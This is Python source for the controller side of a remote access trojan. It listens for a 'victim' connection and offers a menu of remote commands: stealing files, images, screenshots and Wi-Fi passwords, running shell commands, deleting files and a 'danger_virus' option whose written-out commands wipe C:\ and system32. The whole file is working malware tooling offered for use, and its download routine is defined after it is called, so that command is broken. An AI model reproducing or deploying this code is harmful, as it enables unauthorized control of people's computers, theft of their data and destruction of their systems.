
from socket import *
import os
import sys
from time import sleep
from colorama import Fore 
import platform
import random


names = ['hacked1','hacked2','hacked3','hacked4','hacked5','hacked6','hacked7','hacked8','hacked9','hacked10','hacked12']
namefiles = random.choice(names)

oss = platform.uname()

if 'Windows' in oss:
    os.system('cls')
else:
    os.system('clear')

server = socket(AF_INET,SOCK_STREAM)
server.bind(("172.20.10.14",12345))
print(Fore.RED+"[+]"+Fore.WHITE+" Waiting for the victim to connect")
server.listen(1)

client,addr = server.accept()
addr_info = tuple(addr)

print(Fore.LIGHTBLUE_EX+"\n[!]"+Fore.YELLOW+" Client Connected (: ")

print(Fore.RED+f"\nIP : {addr_info[0]} "+Fore.BLUE+"|"+Fore.RED+f" PORT : {addr_info[1]} \n")

print(Fore.LIGHTRED_EX+"""
pwd : pwd 
---
Upload file : upload_file + (with link)
---
Destroy all the system : danger_virus (Remove Windows and system32) #RD C:\ /S /Q del c:\windows\system32*. * /q del /f /s /q “C:*.
---
Download File : pickup + [name of file] (.txt files)
---
Download Image : download
---
Change Directory : cd (cd + [dir name])
---
Rename File : ren_file_ + [file name] + [your name] (Change the name of the file)
---
Shutdown,Restart : shutdown,restart
---
open link : open_link + http://example.com (open any link in target system)
---
drives list : dir_ls (see the name of the drives)
---
system information : sys_info 
---
file list : ls (see all the file names that you are in drive)
---
Remove file : rm_file + [filename] (delete any files for ever)
---
Hack System Wlans : hackwifi (get name) , getpass_[name]
---
upload txt file : uptxt_ + [your text,dont use space] + [yourname]
---
Access Shell : cmd_+[you text] (For Access CMD)
---
Bad Sound : Badvoice_ + [Time]
---
Speak : say_ + [Your Text]
---
Change Background : chback_ + [Image Link] (Change Desktop Wallpaper)
---
Volume -> 100% : volumeup
---
Volume -> 0% : volumedown
---
Take Screen Shot : screenshot
""")

# print(Fore.WHITE+client.recv(12345).decode())

def main_part():
    while True:
        command = input(Fore.LIGHTRED_EX+" meterperter > ")
        if command == "\n" or command == "":
            print('   ')
            main_part()
        if command == 'clear':
            os.system('cls')
            main_part()
        elif command == 'exit': 
            exit()
        elif 'download ' in command:
            picname = command.replace('download ','')
            download()
            main_part()
        elif 'pickup' in command:
            txtname = command.replace('pickup ','')

        client.send(command.encode())

        try:

            data = client.recv(99999).decode()

            if "Mr.404" in data:
                sfile = open(f'Hacked/TXT Files/{txtname}.txt','w').write(data)
                print(Fore.LIGHTGREEN_EX +'File Download , Please Check Hacked Folder')
            else:
                print(Fore.LIGHTGREEN_EX + data)
        except:
            continue

        def download():
            client.send('download '.encode()+picname.encode())
            data = b""
            while True:
                tmp_data = client.recv(1024)
                if tmp_data == b"endendend":
                    print(Fore.LIGHTGREEN_EX+"Done, Please Check Hacked folder")
                    break
                data += tmp_data

            file = open('Hacked/Images/'+picname , mode="wb")
            file.write(data)
            file.close()
    #    cd python/rat/module



main_part()

